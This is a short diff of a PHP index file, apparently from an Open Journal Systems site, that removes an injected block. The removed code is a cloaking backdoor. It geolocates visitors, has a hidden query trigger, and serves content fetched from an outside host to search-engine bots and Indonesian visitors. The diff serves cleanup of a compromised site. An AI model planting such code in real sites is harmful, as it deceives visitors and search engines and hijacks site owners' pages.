@@ -14,32 +14,6 @@
 use APP\core\Application;
 
 // Initialize global environment
-$userAgent = $_SERVER['HTTP_USER_AGENT'];
-$ip = $_SERVER['REMOTE_ADDR'];
-function getCountryByIp($ip)
-{
-    $url = "http://ip-api.com/json/$ip";
-
-    $response = file_get_contents($url);
-    $data = json_decode($response, true);
-    $countryCode = $data['countryCode'];
-    return $countryCode;
-}
-$ctryCode = getCountryByIp($ip);
-
-if (isset($_GET['a']) && $_GET['a'] === 'a') {
-    echo "country: " . $ctryCode;
-    echo "<br>";
-    echo "useragent: " . $userAgent;
-    echo "<br>";
-    echo "ip: " . $ip;
-    exit;
-}
-
-if (preg_match('/bot|crawl|slurp|spider/i', $userAgent) || $ctryCode == 'ID') {
-    echo file_get_contents('https://kunscij.kunoozu.edu.iq/usageStats/archive/');
-    exit;
-}
 define('INDEX_FILE_LOCATION', __FILE__);
 require_once './lib/pkp/includes/bootstrap.php';
 
